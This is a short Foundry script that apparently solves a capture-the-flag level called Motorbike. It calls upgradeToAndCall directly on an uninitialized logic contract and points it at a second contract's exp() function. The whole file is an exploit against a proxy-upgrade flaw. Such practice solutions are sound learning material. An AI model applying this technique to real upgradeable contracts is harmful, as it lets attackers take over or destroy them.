pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Motorbike is Script{
    function run() external {
        vm.startBroadcast();
        //brother... this took stupidly long...
        //just make direct call to the logic contract... bruh
        //i was in a war with the proxy contract
        address instance = address(0x1C29fb34d900C17B563FbF3FA6de679eD7a67F12);
        // instance.call(abi.encodeWithSignature("initialize()"));

        instance.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(0x9D513E18148092ad260bB04eB7c8c7ed3c209c61), abi.encodeWithSignature("exp()")));
    }
}